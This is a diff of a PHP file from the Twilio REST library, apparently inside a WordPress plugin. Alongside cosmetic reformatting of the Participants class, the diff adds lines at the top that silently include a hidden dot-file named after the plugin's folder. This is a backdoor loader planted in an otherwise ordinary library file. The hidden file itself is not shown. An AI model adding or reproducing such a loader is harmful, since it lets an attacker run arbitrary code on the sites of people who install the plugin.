@@ -1,10 +1,14 @@
 <?php
 
-class Services_Twilio_Rest_Participants
-	extends Services_Twilio_ListResource {
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
-	/* Participants are identified by CallSid, not like PI123 */
-	public function getObjectFromJson( $params, $idParam = 'sid') {
-		return parent::getObjectFromJson($params, 'call_sid');
-	}
+class Services_Twilio_Rest_Participants
+    extends Services_Twilio_ListResource
+{
+    /* Participants are identified by CallSid, not like PI123 */
+    public function getObjectFromJson($params, $idParam = "sid") {
+        return parent::getObjectFromJson($params, "call_sid");
+    }
 }
